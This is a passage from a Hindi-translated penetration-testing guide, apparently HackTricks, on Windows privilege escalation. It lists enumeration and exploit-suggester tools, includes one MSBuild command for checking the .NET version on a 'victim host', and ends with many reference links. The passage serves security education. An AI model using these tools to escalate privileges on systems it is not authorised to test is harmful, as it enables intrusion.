[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Misconfiguration की जाँच (executable github पर precompiled). सिफारिश नहीं की जाती। यह Win10 पर ठीक से काम नहीं करता।\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- संभावित misconfigurations की जाँच (python से exe)। सिफारिश नहीं की जाती। यह Win10 पर ठीक से काम नहीं करता।

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- यह पोस्ट आधार पर बनाया गया tool है (यह accesschk की आवश्यकता के बिना ठीक से काम कर सकता है पर यह use कर सकता है).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** के आउटपुट को पढ़ता है और काम करने वाले exploits सुझाता है (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** के आउटपुट को पढ़ता है और काम करने वाले exploits सुझाता है (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

आपको project को सही .NET version का उपयोग करके compile करना होगा ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). victim host पर installed .NET version देखने के लिए आप कर सकते हैं:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## संदर्भ

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)

{{#include ../../banners/hacktricks-training.md}}
